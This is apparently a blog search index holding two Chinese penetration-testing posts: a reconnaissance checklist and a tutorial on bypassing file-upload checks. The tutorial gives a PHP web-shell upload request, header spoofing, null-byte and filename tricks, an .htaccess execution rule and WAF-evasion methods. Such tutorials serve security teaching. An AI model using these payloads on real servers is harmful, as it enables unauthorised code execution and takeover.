<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>信息收集总结</title>
      <link href="/post/ba3bdb90.html"/>
      <url>/post/ba3bdb90.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><h2 id="要收集的信息"><a href="#要收集的信息" class="headerlink" title="要收集的信息"></a>要收集的信息</h2><table><thead><tr><th align="center">收集清单</th><th>详情</th><th>工具</th></tr></thead><tbody><tr><td align="center">基础信息</td><td>1. 注册商 <br>2. 注册人<br>3. 邮箱信息<br>4. DNS解析服务器<br>5. 注册人联系电话<br>6. 企业备案信息</td><td>1. whois<br>2. dnslookup<br>3. 天眼查</td></tr><tr><td align="center">域名信息</td><td>1. 系统域名<br>2. 子域名</td><td>1. OneForAll<br>2. subdomain<br>3. subDomainsBrute<br>4. 子域名挖掘机<br>5. 在线网站</td></tr><tr><td align="center">端口信息</td><td>1. 开放的端口<br>2. 开放端口对应的服务</td><td>1. nmap<br>2. msscan<br>3. 御剑</td></tr><tr><td align="center">系统信息</td><td>1. 操作系统类型<br>2. 中间件类型<br>3. 脚本类型<br>4. 数据库类型<br>5. 服务器类型<br>6. web应用信息<br>-  Web前端框架<br>- Web应用框架<br>- Web开放框架<br>- 指定路径下指定名称的js文件或代码<br>- 指定路径下指定名称的css文件或代码<br>- display:none中的版权信息<br>- 页面底部版权信息，关键字© Powered by等<br>- 注释掉的HTML代码中的内容<br>- http头中的X-Powered-By中的值，有的应用程序框架会在此值输出<br>- cookie中的关键字<br>- robots.txt文件中的关键字<br>- 404报错页面<br>- 302返回时的旗标<br>7. 系统后台<br>8. CMS指纹<br>9. 漏洞库信息<br>10. 编程语言<br>11. 编程框架</td><td></td></tr><tr><td align="center">文件信息</td><td>敏感文件、目录<br>1. WEB-INF/web.xml文件<br>2. 网站备份文件(.rar、.zip、.tar.gz、.bak)、配置文件<br>3. 数据库文件<br>4. SQL注入<br>5.未授权访问<br>6.robots.txt<br>7.后台目录<br>8.网站安装包<br>9.网站上传目录<br>10.mysql管理页面<br>11.PHPinfo<br>12.网站文本编辑器<br>13.SVN信息<br>14.crossdomin.xml<br>15.sitemap.xml<br>16.测试文件<br>17.DS_Store文件<br>18.vim编辑器备份文件(.swp)</td><td></td></tr><tr><td align="center">防火墙</td><td>WAF探测</td><td></td></tr><tr><td align="center">IP信息</td><td>1. 旁站<br>2. C段<br>3. 真实IP<br>4. 别名CNAME<br>5. A<br>6. MX<br>7. AAAA</td><td></td></tr><tr><td align="center">内网入口点信息</td><td>1. 企业邮箱登录口<br>2. VPN登陆口<br>3. 各类OA/crm/sso系统的web入口<br>4. 各类中间件web页面管理入口<br>5. 各类监控系统、防火墙、虚拟化、路由器入口等</td><td></td></tr><tr><td align="center">综合收集</td><td>1. Maltego互联网情报收集<br>2. Recon-NG信息侦查收集工具<br>3. Kali/Parrot中的其他信息收集</td><td></td></tr><tr><td align="center">社会工程</td><td>1. 企业基本信息<br>2. 员工信息（手机号、邮箱、姓名等）、组织框架、企业法人、企业综合信息等<br>3. 网盘信息</td><td></td></tr></tbody></table><h2 id="域名信息"><a href="#域名信息" class="headerlink" title="域名信息"></a>域名信息</h2><h2 id="子域名"><a href="#子域名" class="headerlink" title="子域名"></a>子域名</h2><ol><li><p><a href="https://github.com/shmilylty/OneForAll">OneForAll</a></p></li><li><p>Google Hacking</p></li><li><p>空间探测，fofa、shodan</p></li><li><p>爬虫，burp，awvs</p></li><li><p>IP反查</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://tools.ipip.net</span><br><span class="line">https://dns.bugscaner.com</span><br></pre></td></tr></table></figure></li><li><p>证书</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://censys.io</span><br><span class="line">https://crt.sh</span><br></pre></td></tr></table></figure></li><li><p>人工查看https证书</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">证书  ---&gt; 详细信息 ---&gt; 使用者可选名称</span><br></pre></td></tr></table></figure></li><li><p>DNS A记录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://hackertarget.com/find-dns-host-records/</span><br></pre></td></tr></table></figure></li><li><p>APEX_DOMAIN 记录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://securitytrails.com/list/apex_domain/sony.net</span><br></pre></td></tr></table></figure></li><li><p>DNS流量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://dnsdumpster.com</span><br></pre></td></tr></table></figure></li><li><p>DNS域传送漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DNS服务器配置不当，导致匿名用户利用DNS域传送协议获取某个域的所有记录。通过可以实现DNS域传送协议的程序，尝试匿名进行DNS域传送，获取记录。</span><br><span class="line">可以用Nmap检测，还可以用nslookup、dig检测</span><br></pre></td></tr></table></figure></li><li><p>爆破枚举</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">在线</span><br><span class="line">https://blast.uixsj.cn</span><br><span class="line">https://z.zcjun.com</span><br><span class="line">https://phhpinfo.me.domain</span><br><span class="line">本地</span><br><span class="line">https://github.com/lijiejie/subDomainsBrute</span><br><span class="line">https://github.com/yanxiu0614/subdomain3</span><br><span class="line">御剑子域名挖掘机</span><br></pre></td></tr></table></figure></li></ol><h2 id="真实IP"><a href="#真实IP" class="headerlink" title="真实IP"></a>真实IP</h2><h2 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h2><h2 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h2><h2 id="旁站、C段"><a href="#旁站、C段" class="headerlink" title="旁站、C段"></a>旁站、C段</h2>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传(一)之绕过姿势</title>
      <link href="/post/62304.html"/>
      <url>/post/62304.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>文件上传漏洞可以说是日常渗透测试用得最多的一个漏洞，因为用它获得服务器权限最快最直接。但是想真正把这个漏洞利用好却不那么容易，其中有很多技巧，也有很多需要掌握的知识。俗话说，知己知彼方能百战不殆，因此想要研究怎么防护漏洞，就要了解怎么去利用。此篇文章主要分三部分：总结一些常见的上传文件校验方式，以及绕过校验的各种姿势。</p><h2 id="文件上传校验姿势"><a href="#文件上传校验姿势" class="headerlink" title="文件上传校验姿势"></a>文件上传校验姿势</h2><h3 id="客户端JavaScript校验（一般只校验后缀名）"><a href="#客户端JavaScript校验（一般只校验后缀名）" class="headerlink" title="客户端JavaScript校验（一般只校验后缀名）"></a>客户端JavaScript校验（一般只校验后缀名）</h3><p>一般都是在网页上写一段javascript脚本，校验上传文件的后缀名，有白名单形式也有黑名单形式。<br><strong>判断方式：</strong>在浏览加载文件，但还未点击上传按钮时便弹出对话框，内容如：只允许上传.jpg/.jpeg/.png后缀名的文件，而此时并没有发送数据包。</p><h3 id="服务端校验"><a href="#服务端校验" class="headerlink" title="服务端校验"></a>服务端校验</h3><h4 id="content-type字段校验"><a href="#content-type字段校验" class="headerlink" title="content-type字段校验"></a>content-type字段校验</h4><p>这里以PHP代码为例，模拟web服务器端的校验代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">        if($_FILES[&#x27;userfile&#x27;][&#x27;type&#x27;] != &quot;image/gif&quot;)  #这里对上传的文件类型进行判断，如果不是image/gif类型便返回错误。</span><br><span class="line">                &#123;   </span><br><span class="line">                 echo &quot;Sorry, we only allow uploading GIF images&quot;;</span><br><span class="line">                 exit;</span><br><span class="line">                 &#125;</span><br><span class="line">         $uploaddir = &#x27;uploads/&#x27;;</span><br><span class="line">         $uploadfile = $uploaddir . basename($_FILES[&#x27;userfile&#x27;][&#x27;name&#x27;]);</span><br><span class="line">         if (move_uploaded_file($_FILES[&#x27;userfile&#x27;][&#x27;tmp_name&#x27;], $uploadfile))</span><br><span class="line">        &#123;</span><br><span class="line">                 echo &quot;File is valid, and was successfully uploaded.\n&quot;;</span><br><span class="line">            &#125; </span><br><span class="line">            else &#123;</span><br><span class="line">                     echo &quot;File uploading failed.\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>可以看到代码对上传文件的文件类型进行了判断，如果不是图片类型，返回错误。</p><h4 id="文件头校验"><a href="#文件头校验" class="headerlink" title="文件头校验"></a>文件头校验</h4><p>可以通过自己写正则匹配，判断文件头内容是否符合要求，这里举几个常见的文件头对应关系：<br>（1） .JPEG;.JPE;.JPG，”JPGGraphic File”<br>（2） .gif，”GIF 89A”<br>（3） .zip，”Zip Compressed”<br>（4） .doc;.xls;.xlt;.ppt;.apr，”MS Compound Document v1 or Lotus Approach APRfile”</p><h2 id="文件上传绕过校验姿势"><a href="#文件上传绕过校验姿势" class="headerlink" title="文件上传绕过校验姿势"></a>文件上传绕过校验姿势</h2><h3 id="客户端绕过"><a href="#客户端绕过" class="headerlink" title="客户端绕过"></a>客户端绕过</h3><p>可以利用burp抓包改包，先上传一个gif类型的木马，然后通过burp将其改为asp/php/jsp后缀名即可。</p><h3 id="服务端绕过"><a href="#服务端绕过" class="headerlink" title="服务端绕过"></a>服务端绕过</h3><h4 id="文件类型绕过"><a href="#文件类型绕过" class="headerlink" title="文件类型绕过"></a>文件类型绕过</h4><p>我们可以通过抓包，将content-type字段改为image/gif</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /upload.php HTTP/1.1</span><br><span class="line">TE: deflate,gzip;q=0.3</span><br><span class="line">Connection: TE, close</span><br><span class="line">Host: localhost</span><br><span class="line">User-Agent: libwww-perl/5.803</span><br><span class="line">Content-Type: multipart/form-data; boundary=xYzZY</span><br><span class="line">Content-Length: 155</span><br><span class="line">--xYzZY</span><br><span class="line">Content-Disposition: form-data; name=&quot;userfile&quot;; filename=&quot;shell.php&quot;</span><br><span class="line">Content-Type: image/gif (原为 Content-Type: text/plain)</span><br><span class="line">&lt;?php system($_GET[&#x27;command&#x27;]);?&gt;</span><br><span class="line">--xYzZY-</span><br></pre></td></tr></table></figure><h4 id="文件头绕过"><a href="#文件头绕过" class="headerlink" title="文件头绕过"></a>文件头绕过</h4><p>在木马内容基础上再加了一些文件信息，有点像下面的结构<br>GIF89a<?php phpinfo(); ?></p><h4 id="文件后缀名绕过"><a href="#文件后缀名绕过" class="headerlink" title="文件后缀名绕过"></a>文件后缀名绕过</h4><p>前提：黑名单校验<br>黑名单检测：一般有个专门的 blacklist 文件，里面会包含常见的危险脚本文件。<br>绕过方法：<br>（1）找黑名单扩展名的漏网之鱼 - 比如 asa 和 cer 之类<br>（2）可能存在大小写绕过漏洞 - 比如 aSp 和 pHp 之类<br>能被解析的文件扩展名列表：<br>jsp jspx jspf<br>asp asa cer aspx<br>php php php3 php4<br>exe exee</p><h4 id="配合文件包含漏洞"><a href="#配合文件包含漏洞" class="headerlink" title="配合文件包含漏洞"></a>配合文件包含漏洞</h4><p>前提：校验规则只校验当文件后缀名为asp/php/jsp的文件内容是否为木马。<br>绕过方式：（这里拿php为例，此漏洞主要存在于PHP中）<br>（1）先上传一个内容为木马的txt后缀文件，因为后缀名的关系没有检验内容；<br>（2）然后再上传一个.php的文件，内容为<?php Include(“上传的txt文件路径”);?><br>此时，这个php文件就会去引用txt文件的内容，从而绕过校验，下面列举包含的语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#PHP    </span><br><span class="line">&lt;?php Include(&quot;上传的txt文件路径&quot;);?&gt; </span><br><span class="line">#ASP    </span><br><span class="line">&lt;!--#include file=&quot;上传的txt文件路径&quot; --&gt;</span><br><span class="line">#JSP    </span><br><span class="line">&lt;jsp:inclde page=&quot;上传的txt文件路径&quot;/&gt;</span><br><span class="line">or  </span><br><span class="line">&lt;%@include file=&quot;上传的txt文件路径&quot;%&gt;</span><br></pre></td></tr></table></figure><h4 id="配合服务器解析漏洞"><a href="#配合服务器解析漏洞" class="headerlink" title="配合服务器解析漏洞"></a>配合服务器解析漏洞</h4><p><a href="http://www.cnblogs.com/shellr00t/p/6426856.html">看这篇博客</a></p><h4 id="配合操作系统文件命令规则"><a href="#配合操作系统文件命令规则" class="headerlink" title="配合操作系统文件命令规则"></a>配合操作系统文件命令规则</h4><ul><li><p>上传不符合windows文件命名规则的文件名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">test.asp.</span><br><span class="line">test.asp(空格)</span><br><span class="line">test.php:1.jpg</span><br><span class="line">test.php::$DATA</span><br><span class="line">shell.php::$DATA…….</span><br></pre></td></tr></table></figure><p>会被windows系统自动去掉不符合规则符号后面的内容。</p></li><li><p>linux下后缀名大小写<br>在linux下，如果上传php不被解析，可以试试上传pHp后缀的文件名。</p></li></ul><h4 id="CMS、编辑器漏洞"><a href="#CMS、编辑器漏洞" class="headerlink" title="CMS、编辑器漏洞"></a>CMS、编辑器漏洞</h4><ul><li>CMS漏洞：比如说JCMS等存在的漏洞，可以针对不同CMS存在的上传漏洞进行绕过。</li><li>编辑器漏洞：比如FCK，ewebeditor等，可以针对编辑器的漏洞进行绕过。</li><li>参考以下链接：<br> <a href="https://www.leavesongs.com/PENETRATION/UseOfFckeditor.html">https://www.leavesongs.com/PENETRATION/UseOfFckeditor.html</a><br> <a href="http://shack2.org/article/183.html">http://shack2.org/article/183.html</a><br> <a href="http://www.cnbraid.com/2015/fckeditor.html">http://www.cnbraid.com/2015/fckeditor.html</a><br><a href="https://docs.google.com/document/d/1w_61xR8U7nmn4Y0CvBHpG1uFIU2ORx69QnqTxQt8Km0/edit?pli=1">https://docs.google.com/document/d/1w_61xR8U7nmn4Y0CvBHpG1uFIU2ORx69QnqTxQt8Km0/edit?pli=1</a></li></ul><h4 id="配合其他规则"><a href="#配合其他规则" class="headerlink" title="配合其他规则"></a>配合其他规则</h4><ul><li><strong>0x00截断：</strong>基于一个组合逻辑漏洞造成的，通常存在于构造上传文件路径的时候</li></ul>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">test.php(0x00).jpg</span><br><span class="line">　test.php%00.jpg</span><br><span class="line">　路径/upload/1.php(0x00)，文件名1.jpg，结合/upload/1.php(0x00)/1.jpg</span><br></pre></td></tr></table></figure><p>伪代码演示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">name= getname(httprequest) //假如这时候获取到的文件名是 help.asp.jpg(asp 后面为 0x00)</span><br><span class="line">type =gettype(name)        //而在 gettype()函数里处理方式是从后往前扫描扩展名，所以判断为 jpg</span><br><span class="line">if(type == jpg)</span><br><span class="line">   SaveFileToPath(UploadPath.name, name)   //但在这里却是以 0x00 作为文件名截断</span><br><span class="line">//最后以 help.asp 存入路径里</span><br></pre></td></tr></table></figure><ul><li><strong>.htaccesss</strong><br>上传当前目录的<code>.htaccess</code> 文件<br>例如内容为： <code>AddType application/x-http-php .jpg </code>  (上传的jpg 均以php执行)<br>把<code>.htaccess</code> 上传后，且上传成功后，再上传内容为一句话的<code>jpg</code>文件</li></ul><h4 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a>WAF绕过</h4><h4 id="垃圾数据"><a href="#垃圾数据" class="headerlink" title="垃圾数据"></a>垃圾数据</h4><p>有些主机WAF软件为了不影响web服务器的性能，会对校验的用户数据设置大小上限，比如1M。此种情况可以构造一个大文件，前面1M的内容为垃圾内容，后面才是真正的木马内容，便可以绕过WAF对文件内容的校验；<br><img src="/post/62304/%E7%BB%95%E8%BF%871.png"></p><p>当然也可以将垃圾数据放在数据包最开头，这样便可以绕过对文件名的校验。<br><img src="/post/62304/%E7%BB%95%E8%BF%872.png"></p><p>可以将垃圾数据加上Content-Disposition参数后面，参数内容过长，可能会导致waf检测出错。</p><h4 id="filename"><a href="#filename" class="headerlink" title="filename"></a>filename</h4><p>针对早期版本安全狗，可以多加一个filename。<br><img src="/post/62304/%E7%BB%95%E8%BF%873.png"></p><p>或者将filename换位置，在IIS6.0下如果我们换一种书写方式，把filename放在其他地方：<br><img src="/post/62304/%E7%BB%95%E8%BF%874.png"></p><h4 id="POST-GET"><a href="#POST-GET" class="headerlink" title="POST/GET"></a>POST/GET</h4><p>有些WAF的规则是：如果数据包为POST类型，则校验数据包内容。<br>此种情况可以上传一个POST型的数据包，抓包将POST改为GET。</p><h4 id="利用waf本身缺陷"><a href="#利用waf本身缺陷" class="headerlink" title="利用waf本身缺陷"></a>利用waf本身缺陷</h4><p>删除实体里面的Conten-Type字段<br><img src="/post/62304/%E7%BB%95%E8%BF%875.png"></p><p>第一种是删除Content整行，第二种是删除C后面的字符。删除掉ontent-Type: image/jpeg只留下c，将.php加c后面即可，但是要注意额，双引号要跟着c.php。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">正常包：Content-Disposition: form-data; name=&quot;image&quot;; filename=&quot;085733uykwusqcs8vw8wky.png&quot;Content-Type: image/png</span><br><span class="line">构造包：Content-Disposition: form-data; name=&quot;image&quot;; filename=&quot;085733uykwusqcs8vw8wky.png</span><br><span class="line">C.php&quot;</span><br></pre></td></tr></table></figure><p>删除Content-Disposition字段里的空格<br><img src="/post/62304/%E7%BB%95%E8%BF%876.png"></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
